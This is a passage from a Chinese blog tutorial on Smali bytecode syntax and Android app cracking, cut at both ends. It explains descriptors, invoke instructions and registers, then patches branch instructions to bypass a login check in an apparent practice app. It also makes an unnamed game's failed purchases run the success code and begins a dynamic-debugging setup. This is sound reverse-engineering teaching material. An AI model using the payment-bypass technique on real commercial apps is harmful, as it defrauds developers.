class="table-container"><table><thead><tr><th>原始类型简写</th><th>原始类型</th></tr></thead><tbody><tr><td>B</td><td>byte</td></tr><tr><td>C</td><td>char</td></tr><tr><td>D</td><td>double</td></tr><tr><td>F</td><td>float</td></tr><tr><td>I</td><td>int</td></tr><tr><td>J</td><td>long</td></tr><tr><td>S</td><td>short</td></tr><tr><td>V</td><td>void</td></tr><tr><td>Z</td><td>boolean</td></tr><tr><td>[XXX</td><td>array</td></tr><tr><td>Lxxx/yyy</td><td>object</td></tr></tbody></table></div><p>数组的表示方式是：在基本类型前加上中括号<code>[</code>，例如int数组和float数组分别表示为：<code>[I</code>，<code>[F</code>；对象的表示则以<code>L</code>作为开头，格式是<code>Lpackage/objectName;</code>(注意必须有个分号跟在后面)，例如String对象在Smali中为：<code>Ljava/lang/String;</code>，其中java/lang对应java.lang包，String就是定义在该包中的一个对象。</p><p>或许有人问，既然类是用<code>LpackageName/objectName;</code>来表示，那类里面的内部类又如何在smali中引用呢？<code>LpackageName/objectName$subObjectName;</code>，也就是在内部类前加<code>$</code>符号。</p><p>方法的定义一般为：</p><p>​                                Func-Name(Para-Type1Para-Type2Para-Type3…)Return-Type</p><p>注意参数与参数之间没有任何分隔符。</p><div class="table-container"><table><thead><tr><th>方法</th><th>意义</th></tr></thead><tbody><tr><td>hello ()V</td><td>void hello()</td></tr><tr><td>hello (III)Z</td><td>boolean hello(int, int, int)</td></tr><tr><td>hello (Z[I[ILjava/lang/String;J)Ljava/lang/String;</td><td>String hello(boolean, int[], int[], String, long)</td></tr></tbody></table></div><h3 id="1-3-1-Smali基本语法"><a href="#1-3-1-Smali基本语法" class="headerlink" title="1.3.1 Smali基本语法"></a>1.3.1 Smali基本语法</h3><div class="table-container"><table><thead><tr><th>基本语法</th><th>含义</th></tr></thead><tbody><tr><td>.field private isFlag:Z</td><td>定义变量</td></tr><tr><td>.method</td><td>方法</td></tr><tr><td>.parameter</td><td>方法参数</td></tr><tr><td>.prologue</td><td>方法开始</td></tr><tr><td>.line 123</td><td>此方法位于第123行</td></tr><tr><td>invoke-super</td><td>调用父函数</td></tr><tr><td>const/high16 v0, 0x7f03</td><td>把0x7f03赋值给v0</td></tr><tr><td>invoke-direct</td><td>调用函数</td></tr><tr><td>return-void</td><td>函数返回void</td></tr><tr><td>.end method</td><td>函数结束</td></tr><tr><td>new-instance</td><td>创建实例</td></tr><tr><td>input-object</td><td>对象赋值</td></tr><tr><td>iget-object</td><td>调用对象</td></tr><tr><td>invoke-static</td><td>调用静态函数</td></tr></tbody></table></div><h3 id="1-3-2-条件跳转分支"><a href="#1-3-2-条件跳转分支" class="headerlink" title="1.3.2 条件跳转分支"></a>1.3.2 条件跳转分支</h3><div class="table-container"><table><thead><tr><th>用法</th><th>含义</th></tr></thead><tbody><tr><td>if-eq vA, vB, :cond_0</td><td>如果vA等于vB则跳转到:cond_0</td></tr><tr><td>if-ne vA, vB, :cond_0</td><td>如果vA不等于vB则跳转到:cond_0</td></tr><tr><td>if-lt vA, vB, :cond_0</td><td>如果vA小于vB则跳转到:cond_0</td></tr><tr><td>if-gt vA, vB, :cond_0</td><td>如果vA大于vB则跳转到:cond_0</td></tr><tr><td>if-ge vA, vB, :cond_0</td><td>如果vA大于等于vB则跳转到:cond_0</td></tr><tr><td>if-le vA, vB, :cond_0</td><td>如果vA小于等于vB则跳转到:cond_0</td></tr><tr><td>if-eqz vA, :cond_0</td><td>如果vA等于0则跳转到:cond_0</td></tr><tr><td>if-nez vA, :cond_0</td><td>如果vA不等于0则跳转到:cond_0</td></tr><tr><td>if-ltz vA, :cond_0</td><td>如果vA小于0则跳转到:cond_0</td></tr><tr><td>if-gtz vA, :cond_0</td><td>如果vA大于0则跳转到:cond_0</td></tr><tr><td>if-gez vA, :cond_0</td><td>如果vA大于等于0则跳转到:cond_0</td></tr><tr><td>if-lez vA, :cond_0</td><td>如果vA小于等于0则跳转到:cond_0</td></tr></tbody></table></div><h3 id="1-3-3-Smali中的包信息"><a href="#1-3-3-Smali中的包信息" class="headerlink" title="1.3.3 Smali中的包信息"></a>1.3.3 Smali中的包信息</h3><p><code>.class public Lcom/aaaaa;</code>：是com这个package下的一个类aaaaa</p><p><code>.super Lcom/bbbbb;</code>：继承自com.bbbbb这个类</p><p><code>.source &quot;ccccc.java&quot;</code>：由ccccc.java编译得到的smali文件</p><p>一般来说在smali文件中是这样子的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># annotations</span><br><span class="line">.annotation system Ldalvik/annotation/MemberClasses;</span><br><span class="line">value=&#123;</span><br><span class="line">Lcom/aaa$qqq;,</span><br><span class="line">Lcom/aaa$www;</span><br><span class="line">&#125;</span><br><span class="line">.end annotation</span><br></pre></td></tr></table></figure><p>这个声明是内部类的声明：aaa这个类它有两个成员内部类——qqq和www。</p><h3 id="1-3-4-Smali中的成员变量"><a href="#1-3-4-Smali中的成员变量" class="headerlink" title="1.3.4 Smali中的成员变量"></a>1.3.4 Smali中的成员变量</h3><p>格式：<code>.field public/private [static][final] varName:&lt;类型&gt;</code></p><p>对于不同的成员变量也有不同的指令。一般来说，获取的指令有：iget, sget, iget-boolean, sget-boolean, iget-object, sget-object等。操作的指令有：iput, sput, iput-boolean, sput-boolean, iput-object, sput-object等。</p><p>没有<code>-object</code>后缀的表示操作的成员变量对象是基本数据类型，带<code>-object</code>表示操作的成员变量是对象类型。特别地，boolean类型则使用带<code>-boolean</code>的指令操作。</p><p>例1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sget-object v0, Lcom/aaa;-&gt;ID:Ljava/lang/String;</span><br></pre></td></tr></table></figure><p>sget-object就是用来获取变量值并保存到紧接着的参数的寄存器中，本例中，它获取ID这个String类型的成员变量并放到v0这个寄存器中。注意，前面需要该变量所属的类的类型，后面需要加一个冒号和该成员变量的类型，中间的“-&gt;”表示所属关系。</p><p>例2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iget-object v0, p0, Lcom/aaa;-&gt;view:Lcom/aaa/view;</span><br></pre></td></tr></table></figure><p>可以看到iget-object指令比sget-object多了一个参数，就是该变量所在类的对象，p0即“this”。</p><p>获取array的话可以用aget和aget-object，指令使用方法和上述一致。</p><p>例3：put指令的使用和get指令是统一的如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const/4 v3, 0x0</span><br><span class="line">sput-object v3, Lcom/aaa;-&gt;timer:Lcom/aaa/timer;</span><br></pre></td></tr></table></figure><p>相当于<code>this.timer=null;</code>。</p><p>注意，这里是因为赋值object所以是null；若是boolean的话应该是0。</p><p>例4：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.local v0, args:Landroid/os/Message;</span><br><span class="line">const/4 v1, 0x12</span><br><span class="line">iput v1, v0, Landroid/os/Message;-&gt;what:l</span><br></pre></td></tr></table></figure><p>相当于<code>args.what=18;</code>(args是Message的对象)。</p><h3 id="1-3-5-Smali中函数的调用"><a href="#1-3-5-Smali中函数的调用" class="headerlink" title="1.3.5 Smali中函数的调用"></a>1.3.5 Smali中函数的调用</h3><p>smali中的函数和成员变量一样也分为两种类型，分别为direct和virtual之分。那么direct method和virtual method有什么区别呢？</p><p>简单来说，direct method就是private函数，其余的public和protected函数都属于virtual method。所以在调用函数时，有invoke-direct，invoke-virtual，另外还有invoke-static、invoke-super以及invoke-interface等几种不同的指令。</p><p>当然其实还有invoke-XXX/range 指令的，这是参数多于4个的时候调用的指令，比较少见，了解下即可。</p><h4 id="invoke-static"><a href="#invoke-static" class="headerlink" title="invoke-static"></a>invoke-static</h4><p>用于调用static函数的。</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;&#125;, Lcom/aaa;-&gt;CheckSignature()Z</span><br></pre></td></tr></table></figure><p>这里注意到invoke-static后面有一对大括号“{}”，其实是调用该方法的实例+参数列表，由于这个方法既不需参数也是static的，所以{}内为空。</p><p>再看一个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const-string v0, &quot;NDKLIB&quot; </span><br><span class="line">invoke-static &#123;v0&#125;, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V</span><br></pre></td></tr></table></figure><p>这个是调用static void System.loadLibrary(String)来加载NDK编译的so库用的方法，同样也是这里v0就是参数“NDKLIB”了。</p><h4 id="invoke-super"><a href="#invoke-super" class="headerlink" title="invoke-super"></a>invoke-super</h4><p>调用父类方法用的指令，一般用于调用onCreate、onDestroy等方法。</p><h4 id="invoke-direct"><a href="#invoke-direct" class="headerlink" title="invoke-direct"></a>invoke-direct</h4><p>调用private函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-direct &#123;p0&#125;, Landroid/app/TabActivity;-&gt;&lt;init&gt;()V</span><br></pre></td></tr></table></figure><p>这里init()就是定义在TabActivity中的一个private函数。</p><h4 id="invoke-virtual"><a href="#invoke-virtual" class="headerlink" title="invoke-virtual"></a>invoke-virtual</h4><p>用于调用protected或public函数，同样注意修改smali时不要错用invoke-direct或invoke-static。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sget-object v0, Lcom/dddd;-&gt;bbb:Lcom/ccc;</span><br><span class="line">invoke-virtual &#123;v0, v1&#125;, Lcom/ccc;-&gt;Messages(Ljava/lang/Object;)V</span><br></pre></td></tr></table></figure><p>v0是bbb:Lcom/ccc，v1是传递给Messages方法的Ljava/lang/Object参数。</p><h4 id="invoke-xxxxx-range"><a href="#invoke-xxxxx-range" class="headerlink" title="invoke-xxxxx/range"></a>invoke-xxxxx/range</h4><p>当方法的参数多于5个时（含5个），不能直接使用以上的指令，而是在后面加上“/range”，range表示范围，使用方法也有所不同。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-direct/range &#123;v0 .. v5&#125;, Lcmb/pb/ui/PBContainerActivity;-&gt;h(ILjava/lang/CharSequence;Ljava/lang/String;Landroid/content/Intent;I)Z</span><br></pre></td></tr></table></figure><p>需要传递v0到v5一共6个参数，这时候大括号内的参数采用省略形式，且需要连续。</p><h3 id="1-3-6-Smali中函数返回的结果的操作"><a href="#1-3-6-Smali中函数返回的结果的操作" class="headerlink" title="1.3.6 Smali中函数返回的结果的操作"></a>1.3.6 Smali中函数返回的结果的操作</h3><p>在Java代码中调用函数和返回函数结果可以用一条语句完成，而在Smali里则需要分开来完成，在使用上述指令后，如果调用的函数返回非void，那么还需要用到move-result（返回基本数据类型）和move-result-object（返回对象）指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const-string v0, &quot;Eric&quot;</span><br><span class="line">invoke-static &#123;v0&#125;, Lcmb/pbi;-&gt;t(Ljava/lang/String;)Ljava/lang/String;</span><br><span class="line">move-result-object v2</span><br></pre></td></tr></table></figure><p>v2保存的就是调用t方法返回String字符串。</p><h3 id="1-3-7-Smali中函数实体分析—if函数分析"><a href="#1-3-7-Smali中函数实体分析—if函数分析" class="headerlink" title="1.3.7 Smali中函数实体分析—if函数分析"></a>1.3.7 Smali中函数实体分析—if函数分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.method <span class="keyword">private</span> <span class="title function_">ifRegistered</span><span class="params">()</span>Z</span><br><span class="line">    .locals <span class="number">2</span><span class="comment">//在这个函数中本地寄存器的个数，2个</span></span><br><span class="line">    .prologue</span><br><span class="line">    const/<span class="number">4</span> v0, <span class="number">0x1</span>     <span class="comment">// v0赋值为1</span></span><br><span class="line">    .local v0, tempFlag:Z</span><br><span class="line">    <span class="keyword">if</span>-eqz v0, :cond_0            <span class="comment">// 判断v0是否等于0，等于0则跳到cond_0执行</span></span><br><span class="line">    const/<span class="number">4</span> v1, <span class="number">0x1</span>            <span class="comment">// 符合条件分支</span></span><br><span class="line">    :goto_0<span class="comment">//标签</span></span><br><span class="line">    <span class="keyword">return</span> v1<span class="comment">//返回v1的值</span></span><br><span class="line">    :cond_0<span class="comment">//标签</span></span><br><span class="line">    const/<span class="number">4</span> v1, <span class="number">0x0</span>            <span class="comment">// cond_0分支</span></span><br><span class="line">    goto :goto_0<span class="comment">//跳到goto_0执行 即返回v1的值  这里可以改成return v1  也是一样的</span></span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><h3 id="1-3-8-Smali中函数实体分析—for函数分析"><a href="#1-3-8-Smali中函数实体分析—for函数分析" class="headerlink" title="1.3.8 Smali中函数实体分析—for函数分析"></a>1.3.8 Smali中函数实体分析—for函数分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const/<span class="number">4</span> v0, <span class="number">0x0</span>   <span class="comment">//v0 = 0;</span></span><br><span class="line">.local v0, i:I</span><br><span class="line">:goto_0</span><br><span class="line"><span class="keyword">if</span>-lt v0, v3, :cond_0     <span class="comment">//  v0小于v3 则跳到cond_0并执行分支 :cond_0</span></span><br><span class="line"><span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line">:cond_0                <span class="comment">// 标签</span></span><br><span class="line">iget-object v1, p0, Lcom/aaa/MainActivity;-&gt;listStrings:Ljava/util/List;        <span class="comment">// 引用对象</span></span><br><span class="line">const-string v2, <span class="string">&quot;Eric&quot;</span></span><br><span class="line">invoke-interface &#123;v1, v2&#125;, Ljava/util/List;-&gt;add(Ljava/lang/Object;)Z    <span class="comment">// List是接口, 执行接口方法add</span></span><br><span class="line">add-<span class="type">int</span>/lit8 v0, v0, <span class="number">0x1</span>　　　　<span class="comment">// 将第二个v0寄存器中的值，加上0x1的值放入第一个寄存器中, 实现自增长</span></span><br><span class="line">goto :goto_0                <span class="comment">// 回去:goto_0标签</span></span><br></pre></td></tr></table></figure><h3 id="1-3-9-课后习题"><a href="#1-3-9-课后习题" class="headerlink" title="1.3.9 课后习题"></a>1.3.9 课后习题</h3><p>翻译成Java代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.local <span class="number">4</span>                   <span class="comment">//本地寄存器4个，即v0,v1,v2,v3</span></span><br><span class="line">const/<span class="number">4</span> v2, <span class="number">0x1</span>            <span class="comment">//4字节常量v2=1</span></span><br><span class="line">const/<span class="number">16</span> v1, <span class="number">0x10</span>          <span class="comment">//16字节常量v1=16</span></span><br><span class="line">:local v1, <span class="string">&quot;length&quot;</span>:I      <span class="comment">//本地寄存器int length=v1</span></span><br><span class="line"><span class="keyword">if</span>-nez v1，:cond_1        <span class="comment">//如果v1不等于0，这跳转至cond_1</span></span><br><span class="line">:cond_0                    <span class="comment">//cond_0标签</span></span><br><span class="line">:goto_0                    <span class="comment">//goto_0标签</span></span><br><span class="line"><span class="keyword">return</span> v2                  <span class="comment">//返回v2的值</span></span><br><span class="line">:cond_1                    <span class="comment">//开始执行cond_1标签代码</span></span><br><span class="line">const/<span class="number">4</span> v0,<span class="number">0x0</span>             <span class="comment">//4字节常量v0=0</span></span><br><span class="line">:local v0, <span class="string">&quot;i&quot;</span>:I           <span class="comment">//本地寄存器int i=v0</span></span><br><span class="line">:goto_1                    <span class="comment">//开始执行goto_1标签代码</span></span><br><span class="line"><span class="keyword">if</span>-lt v0, v1, :cond_2      <span class="comment">//如果v0小于v1,则跳转至cond_2</span></span><br><span class="line">const/<span class="number">16</span> v3,<span class="number">0x28</span>           <span class="comment">//接上：如果v0大于等于v1，则执行下面语句： 16字节常量v3=40</span></span><br><span class="line"><span class="keyword">if</span>-le v1,v3, :cond_0       <span class="comment">//接上：如果v1小于等于v3,则跳转至cond_0,即返回v2的值</span></span><br><span class="line">const/<span class="number">4</span> v2, <span class="number">0x0</span>            <span class="comment">//接上：如果v1大于v3,则4字节常量v2=0</span></span><br><span class="line">goto:goto_0                <span class="comment">//跳转至goto_0,即返回v2的值</span></span><br><span class="line">:cond_2                    <span class="comment">//cond_2标签</span></span><br><span class="line">xor-<span class="type">int</span>/lit8 v1, v1, <span class="number">0x3b</span>  <span class="comment">//将第二个v1寄存器中的值与0x3b（59）进行异或运算，得到的值赋值给第一个v1寄存器中</span></span><br><span class="line">add-<span class="type">int</span>/lit8 v0, v0, <span class="number">0x1</span>   <span class="comment">//将第二个v0寄存器中的值加上0x1(1)，所得的值放入第一个v0寄存器中</span></span><br><span class="line">goto:goto_1                <span class="comment">//跳转值goto_1标签，这里可以看到cond_2实际上是一个for循环，而不是简单的IF判断</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">v2 = <span class="number">1</span>;</span><br><span class="line">v1 = <span class="number">16</span>;</span><br><span class="line"><span class="keyword">if</span> (v1 != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    v0 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(v0 &lt; v1)</span><br><span class="line">    &#123;</span><br><span class="line">v1 = v1 ^ <span class="number">59</span>;</span><br><span class="line">v0 = v0 + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">v3 = <span class="number">40</span>;</span><br><span class="line"><span class="keyword">if</span>(v1 &lt;= v3)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br><span class="line">v2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-4-寄存器"><a href="#1-4-寄存器" class="headerlink" title="1.4 寄存器"></a>1.4 寄存器</h2><p>在smali里的所有操作都必须经过寄存器来进行：</p><ul><li>本地寄存器用v开头数字结尾的符号来表示，如v0, v1, v2…</li><li>参数寄存器则使用p开头数字结尾的符号来表示，如p0, p1, p2…</li></ul><p>特别注意的是，p0不一定是函数中的第一个参数，在非static函数中，p0代指“this”，p1表示函数的第一个参数，p2表示函数的第二个参数…而在static函数中p0才对应第一个参数(因为Java的static方法中没有this方法)。</p><h3 id="1-4-1-简单对象分析"><a href="#1-4-1-简单对象分析" class="headerlink" title="1.4.1 简单对象分析"></a>1.4.1 简单对象分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const/<span class="number">4</span> v0, <span class="number">0x1</span></span><br><span class="line">iput-<span class="type">boolean</span> v0, p0, Lcom/aaa;-&gt;IsRegistered:Z</span><br></pre></td></tr></table></figure><p>它使用了本地寄存器v0，并把值0x1存到v0中。用iput-boolean这个指令把v0中存的值存放到com.aaa.IsRegistered这个成员变量中。即相当于：<code>this.IsRegistered=true;</code>。</p><h1 id="2-破解第一个Android程序"><a href="#2-破解第一个Android程序" class="headerlink" title="2. 破解第一个Android程序"></a>2. 破解第一个Android程序</h1><p>破解Android程序需要静态反编译程序Android Killer，打开后第一步配置JDK的安装路径。</p><img src="/posts/15be101a/%E9%85%8D%E7%BD%AEjdk.png" class="" title="配置jdk"><p>从 <a href="https://down.52pojie.cn/Tools/Android_Tools/ShakaApktool_3.0.0-20170503-release.jar">https://down.52pojie.cn/Tools/Android_Tools/ShakaApktool_3.0.0-20170503-release.jar</a> 下载ShakaApktool_3.0.0-20170503-release.jar，将它放到<code>AndroidKiller_v1.3.1\bin\apktool\apktool</code>目录下，按照下图完成操作。</p><img src="/posts/15be101a/%E6%9B%B4%E6%94%B9apktool.png" class="" title="更改apktool"><p>将需要反编译的<code>.apk</code>文件拖进Android Killer后会自动反编译，但最后显示“正在反编译APK源码，请稍等…”时可能会卡住，需要关闭软件再次打开。</p><img src="/posts/15be101a/%E5%BC%82%E5%B8%B8.png" class="" title="异常"><p>找到历史工程重新打开<code>.apk</code>文件，点击入口即可看到smali文件。</p><img src="/posts/15be101a/%E6%88%90%E5%8A%9F%E5%8F%8D%E7%BC%96%E8%AF%91.png" class="" title="成功反编译"><p>如果经常卡住可以试试替换AK目录下的<code>rtl230.bpl</code> <a href="https://www.52pojie.cn/thread-658341-1-1.html">https://www.52pojie.cn/thread-658341-1-1.html</a> 。</p><img src="/posts/15be101a/smali%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90.png" class="" title="smali流程分析"><p>既然了解了流程，就可以动手破解程序了。</p><p>第一种：知道了账户密码，可直接拿那个账户密码登录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：hfdcxy</span><br><span class="line">密码：1234</span><br></pre></td></tr></table></figure><p>第二种：将验证账户密码的两条跳转语句修改。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>-eqz v0, :cond_0-&gt;<span class="keyword">if</span>-nez v0, :cond_0</span><br><span class="line"><span class="keyword">if</span>-eqz v0, :cond_0-&gt;<span class="keyword">if</span>-nez v0, :cond_0</span><br></pre></td></tr></table></figure><p>第三种：直接将验证账户密码的两条跳转语句删除。</p><p>第四种：用goto语句直接跳到登录成功处。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">move-result v0</span><br><span class="line"></span><br><span class="line">goto :goto_3#添加goto</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>-eqz v0, :cond_0</span><br><span class="line"></span><br><span class="line">const-string v0, <span class="string">&quot;1234&quot;</span></span><br><span class="line"></span><br><span class="line">invoke-virtual &#123;p2, v0&#125;, Ljava/lang/String;-&gt;equals(Ljava/lang/Object;)Z</span><br><span class="line"></span><br><span class="line">move-result v0</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>-eqz v0, :cond_0</span><br><span class="line"></span><br><span class="line">.line <span class="number">30</span></span><br><span class="line">:goto_3#添加goto</span><br><span class="line">const-string v0, <span class="string">&quot;\u767b\u5f55\u6210\u529f&quot;</span>#Unicode编码，“登录成功”</span><br></pre></td></tr></table></figure><p>smali修改完成后 Ctrl+S 保存，点击左上角的编译。</p><img src="/posts/15be101a/%E7%BC%96%E8%AF%91%E6%88%90%E5%8A%9F.png" class="" title="编译成功"><p>下载雷电模拟器 <a href="http://www.ldmnq.com/">http://www.ldmnq.com/</a> 充当手机，可以在电脑上运行<code>.apk</code>文件，找到雷电模拟器设备，安装。</p><img src="/posts/15be101a/%E5%AE%89%E8%A3%85.png" class="" title="安装apk"><p>然后在雷电模拟器中运行程序，输入错误的用户名和密码会提示登录成功，说明破解成功。</p><h1 id="3-破解第一个Android游戏"><a href="#3-破解第一个Android游戏" class="headerlink" title="3. 破解第一个Android游戏"></a>3. 破解第一个Android游戏</h1><p>运行一下程序，发现购买会出现“支付失败”字样，其Unicode为<code>\u652F\u4ED8\u5931\u8D25</code>。拖入AK反编译，按照下图搜索字符串，但没有找到。</p><img src="/posts/15be101a/%E6%90%9C%E7%B4%A2%E5%A4%B1%E8%B4%A5.png" class="" title="搜索失败"><p>再找“失败”，可直接在搜索框输入“失败”，再点左下角的编码转换即可转换为Unicode码。找到很多有关“失败”的字符串，一一排除。最后找到一个“购买失败”。</p><img src="/posts/15be101a/%E8%B4%AD%E4%B9%B0%E5%A4%B1%E8%B4%A5.png" class="" title="购买失败"><p>再上下看看可以看到有“购买取消”、“购买成功”等字样。如果看smali难看懂，可以转换成java源码，但转换的源码可读性比较差，还是建议读smali，而且修改必须是在smali里修改才可以成功编译。</p><img src="/posts/15be101a/%E8%BD%AC%E6%8D%A2java%E6%BA%90%E7%A0%81.png" class="" title="转换java源码"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.method <span class="keyword">public</span> <span class="title function_">payResultCancel</span><span class="params">()</span>V</span><br><span class="line">...</span><br><span class="line">.end method#以上为支付取消的代码</span><br><span class="line">    </span><br><span class="line">.method <span class="keyword">public</span> <span class="title function_">payResultFalse</span><span class="params">()</span>V</span><br><span class="line">...</span><br><span class="line">.end method#支付失败</span><br><span class="line">    </span><br><span class="line">.method <span class="keyword">public</span> <span class="title function_">payResultSuccess</span><span class="params">()</span>V</span><br><span class="line">...</span><br><span class="line">.end method#支付成功</span><br></pre></td></tr></table></figure><p>首先来个简单粗暴的方法，直接将<code>public void payResultSuccess()</code>方法里的代码全都复制到<code>public void payResultCancel()</code>和<code>public void payResultFalse()</code>中。再删除可能会产生费用的危险权限：在<code>AndroidManifest.xml</code>里搜索（或者直接搜索）<code>android.permission.SEND_SMS</code> 和 <code>android.permission.CALL_PHONE</code>，删掉 <code>&lt;uses-permission android:name=&quot;android.permission.SEND_SMS&quot;/&gt;</code> 和 <code>&lt;uses-permission android:name=&quot;android.permission.CALL_PHONE&quot;/&gt;</code> 即可。</p><p>第二种方法，再观察一下代码，到底是哪里开始分岔到“购买成功”、“购买取消”、“购买失败”的呢？搜索payResultFalse找到有跳转处的地方。</p><img src="/posts/15be101a/%E4%BF%AE%E6%94%B9%E4%BB%A3%E7%A0%81.png" class="" title="修改代码"><p>同上，再删除可能会产生费用的危险权限，编译。</p><h1 id="4-AS动态调试smali代码"><a href="#4-AS动态调试smali代码" class="headerlink" title="4. AS动态调试smali代码"></a>4. AS动态调试smali代码</h1><p>下载Android Studio，这里有个非常大的坑耗了我两天时间，由于在官网下载不了，导致我去别的地方下载了无数版本的AS，最后安装smalidea插件造成各种问题。</p><p>解决办法：把官网链接https改为http即可。</p><p><a href="http://redirector.gvt1.com/edgedl/android/studio/install/2021.1.1.22/android-studio-2021.1.1.22-windows.exe">http://redirector.gvt1.com/edgedl/android/studio/install/2021.1.1.22/android-studio-2021.1.1.22-windows.exe</a></p><p>动态调试需要smalidea插件，下载最新版的<code>smalidea-0.06.zip</code>压缩包。最后直接导入插件，不要解压。安装、导入自行百度。可以新建一个项目直接连入模拟器看AS是否能够正常运行。第一次新建项目花费时间长一点，我不会说我新建一个项目花了15分钟！！！</p><p>将<code>.apk</code>文件拖进AK反编译成<code>.smali</code>文件，文件入口为<code>hfdcxy.com.myapplication.MainActivity</code>。在<code>application</code>标签里找<code>android:debuggable=&quot;true&quot;</code>这句代码。如果没有这句代码就调试不了，如果是<code>false</code>则改为<code>true</code>，重新编译签名。将新编译好的<code>.apk</code>安装在模拟器上。</p><img src="/posts/15be101a/debuggertrue.png" class="" title="debuggertrue"><p>在<code>.apk</code>文件右键，打开文件路径。</p><img src="/posts/15be101a/%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84.jpg" class="" title="打开文件路径"><p>把整个project目录复制到某处，用AS导入。给smali目录设置Sources Root。</p><img src="/posts/15be101a/sourcesroot.jpg" class="" title="sourcesroot"><p>Run-&gt;Edit configurations-&gt;+-&gt;Remote JVM Debug-&gt;设置Name，设置端口号为8700。</p><img src="/posts/15be101a/%E8%AE%BE%E7%BD%AEremote.png" class="" title="设置remote"><p>打开CMD，运行以下命令，将会显示以下信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 